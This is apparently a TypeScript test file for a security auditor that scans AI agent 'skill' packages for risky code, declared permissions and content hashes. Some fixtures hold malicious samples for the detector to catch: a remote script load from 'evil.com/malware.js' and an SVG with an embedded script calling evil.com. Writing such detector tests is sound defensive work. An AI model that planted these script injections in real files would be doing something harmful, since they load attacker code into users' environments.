/**
 * P3-27: Skill Sandbox — security audit tests
 *
 * 验证恶意代码检测、权限声明提取、内容哈希计算等功能。
 */

import { describe, it, expect } from "vitest";
import { auditSkillInstallation, computeContentHash, validatePermissions, getPermissionDescription } from "../core/skill/sandbox";

describe("Skill Sandbox — auditSkillInstallation", () => {
  it("should return safe for clean content", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\ndescription: A clean skill\n---\nThis is a safe skill."],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("safe");
    expect(result.findings.length).toBe(0);
  });

  it("should detect eval() as danger", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nSafe skill"],
      ["helper.js", "function runCode(code) { return eval(code); }"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("danger");
    expect(result.findings.some(f => f.category === "rce")).toBe(true);
  });

  it("should detect child_process as danger", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nSafe skill"],
      ["index.js", "const { exec } = require('child_process'); exec('ls');"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("danger");
    expect(result.findings.some(f => f.category === "rce")).toBe(true);
  });

  it("should detect remote script loading as danger", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\n<script src='https://evil.com/malware.js'></script>"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("danger");
  });

  it("should detect fetch() as danger (network)", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nSafe skill"],
      ["main.js", "fetch('https://api.example.com/data')"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("danger");
    expect(result.findings.some(f => f.category === "network")).toBe(true);
  });

  it("should detect btoa/atob as warning", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nSafe skill"],
      ["utils.js", "const encoded = btoa('data'); const decoded = atob(encoded);"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("warning");
    expect(result.findings.some(f => f.category === "encoding")).toBe(true);
  });

  it("should detect localStorage as warning", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nUses localStorage for storage"],
      ["app.js", "const data = localStorage.getItem('key');"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("warning");
    expect(result.findings.some(f => f.category === "storage")).toBe(true);
  });

  it("should extract permissions from SKILL.md frontmatter (list format)", () => {
    const skillMd = `---
name: test
permissions:
  - file:read
  - file:write
  - network:fetch
---
Content here`;
    const result = auditSkillInstallation(new Map(), skillMd);
    expect(result.declaredPermissions).toContain("file:read");
    expect(result.declaredPermissions).toContain("file:write");
    expect(result.declaredPermissions).toContain("network:fetch");
  });

  it("should extract permissions from SKILL.md frontmatter (inline format)", () => {
    const skillMd = `---
name: test
permissions: [file:read, command:exec, memory:write]
---
Content`;
    const result = auditSkillInstallation(new Map(), skillMd);
    expect(result.declaredPermissions).toContain("file:read");
    expect(result.declaredPermissions).toContain("command:exec");
    expect(result.declaredPermissions).toContain("memory:write");
  });

  it("should add warning for dangerous declared permissions", () => {
    const skillMd = `---
name: test
permissions: [command:exec, network:fetch]
---
Clean content`;
    const result = auditSkillInstallation(new Map(), skillMd);
    expect(result.findings.some(f => f.category === "permission")).toBe(true);
  });

  it("should skip binary file extensions except SVG", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nClean skill"],
      ["image.png", "fake binary data"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("safe");
  });

  it("should audit SVG files for scripts", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nClean skill"],
      ["icon.svg", "<svg><script>fetch('https://evil.com')</script></svg>"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    expect(result.overall).toBe("danger");
  });

  it("should deduplicate findings from same file and category", () => {
    const files = new Map<string, string>([
      ["SKILL.md", "---\nname: test\n---\nClean skill"],
      ["code.js", "fetch('https://a.com'); fetch('https://b.com');"],
    ]);
    const result = auditSkillInstallation(files, files.get("SKILL.md")!);
    const networkFindings = result.findings.filter(f => f.category === "network" && f.filePath === "code.js");
    expect(networkFindings.length).toBe(1);
  });
});

describe("Skill Sandbox — computeContentHash", () => {
  it("should produce consistent hash for same content", () => {
    const files1 = new Map([["a.txt", "hello"], ["b.txt", "world"]]);
    const files2 = new Map([["a.txt", "hello"], ["b.txt", "world"]]);
    expect(computeContentHash(files1)).toBe(computeContentHash(files2));
  });

  it("should produce different hash for different content", () => {
    const files1 = new Map([["a.txt", "hello"], ["b.txt", "world"]]);
    const files2 = new Map([["a.txt", "hello"], ["b.txt", "WORLD"]]);
    expect(computeContentHash(files1)).not.toBe(computeContentHash(files2));
  });

  it("should produce different hash for different file names", () => {
    const files1 = new Map([["a.txt", "hello"]]);
    const files2 = new Map([["b.txt", "hello"]]);
    expect(computeContentHash(files1)).not.toBe(computeContentHash(files2));
  });

  it("should be order-independent", () => {
    const files1 = new Map([["a.txt", "hello"], ["b.txt", "world"]]);
    const files2 = new Map([["b.txt", "world"], ["a.txt", "hello"]]);
    expect(computeContentHash(files1)).toBe(computeContentHash(files2));
  });
});

describe("Skill Sandbox — validatePermissions", () => {
  it("should return empty for known permissions", () => {
    const unknown = validatePermissions(["file:read", "file:write", "command:exec"]);
    expect(unknown).toEqual([]);
  });

  it("should return unknown permissions", () => {
    const unknown = validatePermissions(["file:read", "custom:dangerous", "unknown:perm"]);
    expect(unknown).toContain("custom:dangerous");
    expect(unknown).toContain("unknown:perm");
    expect(unknown.length).toBe(2);
  });
});

describe("Skill Sandbox — getPermissionDescription", () => {
  it("should return Chinese description for known permission", () => {
    expect(getPermissionDescription("file:read", "zh")).toBe("读取文件");
    expect(getPermissionDescription("command:exec", "zh")).toBe("执行命令");
  });

  it("should return English description for known permission", () => {
    expect(getPermissionDescription("file:read", "en")).toBe("Read files");
    expect(getPermissionDescription("network:fetch", "en")).toBe("Make network requests");
  });

  it("should return the permission name for unknown permissions", () => {
    expect(getPermissionDescription("custom:perm", "zh")).toBe("custom:perm");
    expect(getPermissionDescription("custom:perm", "en")).toBe("custom:perm");
  });
});
